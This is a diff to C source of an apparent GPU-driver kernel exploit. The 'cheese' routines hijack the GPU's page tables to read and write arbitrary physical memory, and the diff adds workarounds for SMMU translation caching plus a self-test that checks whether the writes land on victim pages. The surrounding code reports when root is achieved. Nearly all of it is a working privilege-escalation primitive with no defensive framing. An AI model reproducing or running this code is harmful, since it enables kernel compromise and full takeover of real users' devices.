@@ -279,6 +279,24 @@ const uint64_t kFakeGpuAddr = 0x40403000;
 const uint64_t kGarbageSize = 16 * 1024 * 1024;
 
 static uint32_t g_marker = 0x41414141u;
+/* When set, writes are performed as an inline CP_MEM_TO_MEM copy from a staged slot in our own
+ * table page instead of CP_MEM_WRITE (which appears to be deferred until after TTBR0 is restored). */
+static int g_write_via_copy = 0;
+/* A leading CP_MEM_WRITE does not establish the hijacked translation and appears to poison the rest
+ * of the drawstate (even the completion marker is lost). A leading CP_MEM_TO_MEM does establish it.
+ * So: optionally emit a dummy MEM_TO_MEM preamble before writes. */
+static int g_write_preamble = 0;
+/* Use a different VA page for the write than the one the setup read used: the SMMU may cache the
+ * page translation for the VA page touched first, so later accesses through it hit a stale entry.
+ * The fake table's extra entries map target_pa + i*0x1000, so VA kFakeGpuAddr + (2+i)*0x1000
+ * reaches the same physical page through a *fresh* VA page. */
+static int g_write_va_extra = 0;
+#define K_COPY_SRC_VA (kFakeGpuAddr + 0x1200)   /* -> table page + 0x200 */
+
+static void cheese_stage_dword(void *tpage, uint32_t val) {
+    *(uint32_t *)((char *)tpage + 0x200) = val;
+    sync_cache_to_gpu((char *)tpage + 0x200, (char *)tpage + 0x204);
+}
 
 static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
     uint32_t* drawstate_buf = payload_buf + 0x100;
@@ -291,10 +309,28 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     drawstate_cmds += cp_wait_for_me(drawstate_cmds);
     drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
     if (write) {
-        *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
-        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
-        for (int i = 0; i < count; i++) {
-            *drawstate_cmds++ = values[i];
+        if (g_write_preamble) {
+            /* dummy copy: read the target into a scratch slot in our table page */
+            *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
+            *drawstate_cmds++ = 0;
+            drawstate_cmds += cp_gpuaddr(drawstate_cmds, K_COPY_SRC_VA + 0x10);
+            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
+        }
+        uint64_t wdst = write_addr + ((uint64_t)g_write_va_extra << 12);
+        if (g_write_via_copy) {
+            /* Inline copy: dest = target address, src = staged slot in our table page. */
+            for (uint32_t i = 0; i < count; i++) {
+                *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                *drawstate_cmds++ = 0;
+                drawstate_cmds += cp_gpuaddr(drawstate_cmds, wdst + 4u * i);
+                drawstate_cmds += cp_gpuaddr(drawstate_cmds, K_COPY_SRC_VA + 4u * i);
+            }
+        } else {
+            *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
+            drawstate_cmds += cp_gpuaddr(drawstate_cmds, wdst);
+            for (int i = 0; i < count; i++) {
+                *drawstate_cmds++ = values[i];
+            }
         }
     } else {
         if (count == 1) {
@@ -681,6 +717,57 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
             fprintf(stderr, "kernel text restored (first dword now %#x)\n", c0);
         }
         fprintf(stderr, "ROOT RESULT: uid=%d %s\n", getuid(), getuid() == 0 ? "*** ROOT ACHIEVED ***" : "(not root)");
+        exit(0);
+    }
+
+    if (getenv("CHEESE_CMD_SELFTEST")) {
+        /* Is the write failing because the SMMU cached the translation of the VA page the setup
+         * read used? Compare writing through that VA page (extra=0) vs a fresh one (extra=2). */
+        uint8_t *vp = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        for (int i = 0; i < 4096; i += 4) *(uint32_t *)(vp + i) = 0xAAAAAAAAu;
+        mlock(vp, PAGE_SIZE);
+        uint64_t vpa = leak_phys_page(vp);
+        sync_cache_to_gpu(vp, vp + PAGE_SIZE);
+        fprintf(stderr, "CMDTEST victim pa=0x%lx ; table pa=0x%lx\n", vpa, phyaddr);
+
+        struct { const char *name; int extra; uint64_t page; uint32_t off, val; } t[4] = {
+            { "victim, VApage used by setup (e=0)", 0, 0, 0x080, 0xdead0001u },
+            { "victim, FRESH VApage        (e=2)", 2, 0, 0x0C0, 0xdead0002u },
+            { "table,  VApage used by setup (e=0)", 0, 1, 0x500, 0xdead0003u },
+            { "table,  FRESH VApage        (e=2)", 2, 1, 0x600, 0xdead0004u },
+        };
+        for (int i = 0; i < 4; i++) {
+            uint64_t pg = t[i].page ? phyaddr : vpa;
+            uint64_t ta = pg + t[i].off;
+            uint32_t tv = t[i].val;
+            g_write_va_extra = t[i].extra;
+            g_write_preamble = 0;
+            g_write_via_copy = 0;
+            if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, ta & ~0xfffull)) {
+                fprintf(stderr, "CMDTEST %s: setup failed\n", t[i].name); continue;
+            }
+            if (t[i].page) *(uint32_t *)((char *)target_physical_page + t[i].off) = 0x11111111u;
+            sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
+            g_marker = 0x7000 + i;
+            int rc = DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr,
+                             kFakeGpuAddr + 0x1100, /*write=*/true,
+                             kFakeGpuAddr + (ta & 0xfff), 1, &tv);
+            usleep(5000);
+            uint32_t after; const char *how;
+            if (t[i].page) {
+                sync_cache_from_gpu((char *)target_physical_page + t[i].off,
+                                    (char *)target_physical_page + t[i].off + 4);
+                after = *(volatile uint32_t *)((char *)target_physical_page + t[i].off);
+                how = "cpu";
+            } else {
+                after = cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr,
+                                          target_physical_page, phyaddr, ta, 0x7100 + i);
+                how = "gpu";
+            }
+            fprintf(stderr, "CMDTEST %-36s rc=%d %s=0x%08x %s\n", t[i].name, rc, how, after,
+                    (after == tv) ? "*** LANDED ***" : "(no)");
+        }
+        g_write_va_extra = 0;
         exit(0);
     }
 
